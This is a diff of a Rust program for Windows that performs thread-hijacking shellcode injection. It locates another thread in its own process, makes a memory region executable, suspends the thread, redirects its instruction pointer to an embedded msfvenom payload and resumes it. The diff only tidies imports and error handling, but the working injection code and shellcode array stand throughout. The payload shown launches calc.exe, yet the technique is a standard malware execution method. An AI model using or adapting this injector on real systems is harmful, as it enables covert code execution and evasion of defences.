@@ -1,35 +1,36 @@
-use std::{
-    mem::size_of,
-    ptr::{copy_nonoverlapping, null},
+use {
+    std::{
+        mem::size_of,
+        ptr::{copy_nonoverlapping, null},
+    },
+    windows::Win32::{
+        System::{
+            Diagnostics::{
+                Debug::{GetThreadContext, SetThreadContext, CONTEXT},
+                ToolHelp::{CreateToolhelp32Snapshot, Thread32First, Thread32Next, TH32CS_SNAPTHREAD, THREADENTRY32},
+            },
+            Memory::{VirtualAlloc, VirtualProtect, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
+                PAGE_PROTECTION_FLAGS, PAGE_READWRITE,
+            },
+            Threading::{
+                GetCurrentProcessId, GetCurrentThreadId, OpenThread, ResumeThread, SuspendThread,
+                WaitForSingleObject, INFINITE, THREAD_ALL_ACCESS,
+            }
+        }, 
+        Foundation::HANDLE, System::Diagnostics::Debug::CONTEXT_ALL_AMD64,
+    },
 };
-use windows::Win32::System::{
-    Diagnostics::{
-        Debug::{GetThreadContext, SetThreadContext, CONTEXT},
-        ToolHelp::{
-            CreateToolhelp32Snapshot, Thread32First, Thread32Next, TH32CS_SNAPTHREAD, THREADENTRY32,
-        },
-    },
-    Memory::{
-        VirtualAlloc, VirtualProtect, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
-        PAGE_PROTECTION_FLAGS, PAGE_READWRITE,
-    },
-    Threading::{
-        GetCurrentProcessId, GetCurrentThreadId, OpenThread, ResumeThread, SuspendThread,
-        WaitForSingleObject, INFINITE, THREAD_ALL_ACCESS,
-    },
-};
-use windows::Win32::{Foundation::HANDLE, System::Diagnostics::Debug::CONTEXT_ALL_AMD64};
 
-fn find_thread() -> Result<HANDLE, String> {
-    let process_pid = unsafe { GetCurrentProcessId() };
-    let thread_pid = unsafe { GetCurrentThreadId() };
+unsafe fn find_thread() -> Result<HANDLE, String> {
+    let process_pid = GetCurrentProcessId();
+    let thread_pid = GetCurrentThreadId();
     let hsnap = unsafe {CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0).map_err(|_| "Failed to create snapshot".to_string())?};
     let mut thr = THREADENTRY32 {
         dwSize: size_of::<THREADENTRY32>() as u32,
         ..Default::default()
     };
 
-    if unsafe { Thread32First(hsnap, &mut thr).is_ok() } {
+    if Thread32First(hsnap, &mut thr).is_ok() {
         loop {
             if thr.th32OwnerProcessID == process_pid && thr.th32ThreadID != thread_pid {
                 let h_thread = unsafe {
@@ -38,7 +39,7 @@ fn find_thread() -> Result<HANDLE, String> {
                 return Ok(h_thread);
             }
 
-            if unsafe { Thread32Next(hsnap, &mut thr).is_err() } {
+            if Thread32Next(hsnap, &mut thr).is_err() {
                 break;
             }
         }
@@ -46,7 +47,7 @@ fn find_thread() -> Result<HANDLE, String> {
     Err("Thread not found".to_string())
 }
 
-fn main() -> Result<(), String>{
+fn main() -> Result<(), String> {
     // msfvenom -p windows/x64/exec CMD=calc.exe -f rust
     let shellcode: [u8; 276] = [
         0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52,
@@ -102,9 +103,7 @@ fn main() -> Result<(), String>{
             shellcode.len(),
             PAGE_EXECUTE_READWRITE,
             &mut oldprotect,
-        ).unwrap_or_else(|e| {
-            eprintln!("[!] VirtualProtect Failed With Error: {e}");
-        });
+        ).map_err(|e| format!("VirtualProtect Failed With Error: {e}"))?;
 
         let mut ctx_thread = CONTEXT {
             ContextFlags: CONTEXT_ALL_AMD64,
@@ -114,16 +113,12 @@ fn main() -> Result<(), String>{
         SuspendThread(hthread);
 
         println!("[+] Retrieving thread context");
-        GetThreadContext(hthread, &mut ctx_thread).unwrap_or_else(|e| {
-            panic!("[!] GetThreadContext Failed With Error: {e}");
-        });
+        GetThreadContext(hthread, &mut ctx_thread).map_err(|e| format!("GetThreadContext Failed With Error: {e}"))?;
 
         ctx_thread.Rip = address as u64;
 
         println!("[+] Setting the thread context");
-        SetThreadContext(hthread, &ctx_thread).unwrap_or_else(|e| {
-            panic!("[!] SetThreadContext Failed With Error: {e}");
-        });
+        SetThreadContext(hthread, &ctx_thread).map_err(|e| format!("SetThreadContext Failed With Error: {e}"))?;
 
         println!("[+] Thread Executed!");
 
